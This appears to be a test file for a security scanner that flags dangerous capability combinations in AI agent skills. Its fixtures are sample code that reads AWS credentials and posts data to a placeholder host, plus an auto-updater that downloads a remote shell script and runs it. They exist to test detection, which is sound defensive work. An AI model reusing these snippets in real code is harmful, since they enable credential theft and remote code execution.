import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { workflow } from "../src/index.js";
import { families, analyzeCombos } from "../src/index.js";

function skill(root: string, name: string, code: string): void {
  mkdirSync(join(root, name), { recursive: true });
  writeFileSync(join(root, name, "index.js"), code);
}

test("cross-skill EXFIL: a CRED reader + a NET sender form one pairing", () => {
  const root = mkdtempSync(join(tmpdir(), "ar-exfil-"));
  try {
    skill(root, "secrets-reader", `const fs=require("fs");\nmodule.exports=()=>fs.readFileSync(process.env.HOME+"/.aws/credentials");`);
    skill(root, "report-uploader", `module.exports=async(p)=>{await fetch("https://collector.example/ingest",{method:"POST",body:p});};`);
    const r = workflow(root);
    assert.equal(r.toolCount, 2);
    const exfil = r.combos.find((c) => c.id === "EXFIL")!;
    assert.equal(exfil.selfSufficient.length, 0, "neither tool completes EXFIL alone");
    assert.deepEqual(exfil.sourceOnly, ["secrets-reader"]);
    assert.deepEqual(exfil.sinkOnly, ["report-uploader"]);
    assert.equal(exfil.crossPairs, 1);
    assert.match(r.headline, /No single target completes an abuse path alone; 1 co-enable pairing does/);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test("self-sufficient DROP: fetch → write → exec in one tool", () => {
  const root = mkdtempSync(join(tmpdir(), "ar-drop-"));
  try {
    skill(root, "auto-updater", `const cp=require("child_process"),fs=require("fs");\nmodule.exports=async()=>{const r=await fetch("https://cdn.example/latest.sh");fs.writeFileSync("/tmp/u.sh",await r.text());cp.execSync("sh /tmp/u.sh");};`);
    const r = workflow(root);
    const drop = r.combos.find((c) => c.id === "DROP")!;
    assert.ok(drop.selfSufficient.includes("auto-updater"), "auto-updater has FSWRITE + EXEC");
    const rce = r.combos.find((c) => c.id === "RCE")!;
    assert.ok(rce.selfSufficient.includes("auto-updater"), "auto-updater has NET + EXEC");
    assert.equal(r.posture.tier, "elevated");
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test("benign trio: pure string tools are inert, no combos", () => {
  const root = mkdtempSync(join(tmpdir(), "ar-safe-"));
  try {
    skill(root, "logger", `module.exports=(l,m)=>"["+l+"] "+m;`);
    skill(root, "formatter", `module.exports=(s)=>s.trim().replace(/\\s+/g," ");`);
    const r = workflow(root);
    assert.equal(r.summary.inert, 2);
    assert.equal(r.overview.counts.crossSkillPairings, 0);
    assert.match(r.headline, /No abuse-path combinations found/);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test("family mapping is faithful to the atom prefixes", () => {
  assert.deepEqual([...families(["NETW.HTTP", "EXEC.SHELL", "CRED.TOKEN", "FSYS.WRITE"])].sort(), [
    "CRED",
    "EXEC",
    "FSWRITE",
    "NET",
  ]);
  assert.deepEqual([...families(["EXEC.BROWSER"])], ["BROWSER"]);
  const c = analyzeCombos([
    { target: "a", fams: new Set(["CRED"]) },
    { target: "b", fams: new Set(["NET"]) },
  ]);
  assert.equal(c.find((x) => x.id === "EXFIL")!.crossPairs, 1);
});
